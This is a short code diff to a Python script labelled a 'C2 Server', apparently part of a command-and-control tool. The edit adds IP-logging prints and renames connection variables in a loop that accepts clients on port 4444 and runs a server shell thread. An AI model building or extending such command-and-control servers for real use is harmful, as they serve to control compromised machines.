@@ -118,18 +118,21 @@ def main():
     server.bind(("0.0.0.0", 4444))
     server.listen(5)
     print("[*] C2 Server started on port 4444")
+    print(f"[*] Server IP: {socket.gethostbyname(socket.gethostname())}")
 
     # Server Shell in eigenem Threat starten
     threading.Thread(target=server_shell, daemon=True).start()
 
     try:
         while True:
-            client_socket, client_address = server.accept()
+            conn, addr = server.accept()
+            print("Client connected from", addr)
+            print("Local IP used for this connection:", conn.getsockname()[0])
             with lock:
                 client_id += 1
                 client_thread = threading.Thread(
                     target=handle_client,
-                    args=(client_socket, client_address, client_id),
+                    args=(conn, addr, client_id),
                 )
                 client_thread.daemon = True
                 client_thread.start()
